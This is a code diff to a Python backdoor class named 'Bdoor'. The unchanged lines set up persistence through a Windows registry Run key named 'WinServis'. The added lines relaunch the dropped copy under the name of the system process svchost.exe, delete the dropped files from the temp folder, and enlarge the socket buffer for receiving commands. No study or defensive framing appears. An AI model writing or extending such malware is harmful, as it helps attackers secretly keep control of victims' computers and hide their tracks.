@@ -12,6 +12,7 @@ import base64
 import time
 import sys
 import os
+import tempfile
 
 class Bdoor:
 
@@ -33,6 +34,17 @@ class Bdoor:
             # Copy the current executalbe file.
             shutil.copyfile(sys.executable, l_pers__)
             subprocess.run('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinServis /t REG_SZ /d "' + l_pers__ + '"', shell=True)
+            os.chdir(os.path.dirname(os.path.abspath(l_pers__)))
+            subprocess.Popen(r'svchost.exe', shell=True)
+            sys.exit()
+        elif os.path.exists(tempfile.gettempdir() + "\\" + "svchost.exe"):
+            time.sleep(1)
+            cwd = os.getcwd()
+            os.chdir(tempfile.gettempdir())
+            os.remove("svchost.exe")
+            os.remove("sys_icon.jpg")
+            os.chdir(cwd)
+
 
     def send_data(self, data):
         json_data = json.dumps(data)
@@ -44,7 +56,7 @@ class Bdoor:
         json_data = ""
         while True:
             try:  
-                json_data += self.conn.recv(1024).decode()
+                json_data += self.conn.recv(1024*8).decode()
                 if json_data == "" or json_data == b'':
                     break
                 # print("\njson_data type: " + str(type(json_data)) + " - json_data: " + json_data) #testing
